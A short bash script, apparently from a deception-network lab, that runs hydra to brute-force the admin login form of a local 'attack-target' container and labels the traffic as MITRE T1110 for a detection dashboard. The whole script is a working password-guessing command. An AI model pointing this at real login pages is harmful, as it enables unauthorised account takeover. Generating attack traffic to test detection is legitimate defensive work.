#!/bin/bash
# Brute-force the attack-target web login with hydra -> T1110 Brute Force.
# Usage: docker compose up, then:
#   docker cp attacker/scripts/hydra-attack.sh deciptionnet-attacker-1:/opt/attack/scripts/hydra-attack.sh
#   docker compose exec attacker bash /opt/attack/scripts/hydra-attack.sh
set -u
HOST="${TARGET_HOST:-attack-target}"
PORT="${TARGET_PORT:-9090}"
PASSLIST="${PASSLIST:-/opt/attack/scripts/mini-pass.txt}"

echo "[*] Hydra brute force -> $HOST:$PORT/login (username: admin)"
# Host is a separate positional arg before the http-post-form service; the
# form string is path:parameters:fail_condition. ^USER^/^PASS^ are hydra vars.
hydra -l admin -P "$PASSLIST" "$HOST" http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -s "$PORT" -t 4
echo "[+] done. Watch T1110 sessions land on the dashboard."